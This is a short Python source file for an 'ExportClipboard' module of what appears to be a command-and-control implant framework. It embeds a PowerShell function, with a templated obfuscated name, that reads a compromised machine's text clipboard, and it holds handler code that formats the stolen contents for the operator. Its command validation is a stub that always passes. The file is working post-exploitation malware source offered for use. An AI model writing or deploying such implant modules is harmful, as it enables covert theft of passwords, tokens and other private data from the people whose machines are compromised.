class ExportClipboard:
    type = "EC"
    args = None
    input = "export_clipboard"

    def process_implant_response(self, data, args):
        if data.decode() == "2":
            return "Clipboard is empty (Or contained only '2')", None
        else:
            return f"Clipboard contents:\n{data.decode()}", None

    def implant_text(self):
        var ='''
function {{ ron.obf_get_clipboard }}() {
    $b = "Text"
    $a = Get-Clipboard -Format $b
    if ($a -ne $null ){$global:tr = $a}
    else {$global:tr = "2"}
}'''
        return var

    def pre_process_command(self, argument_string):
        # Check if the argument to be passed to the implant is valid.
        # I.e.
        #    Does the file to be uploaded exist local?
        #    Is the command to be executed dangerous?
        return True
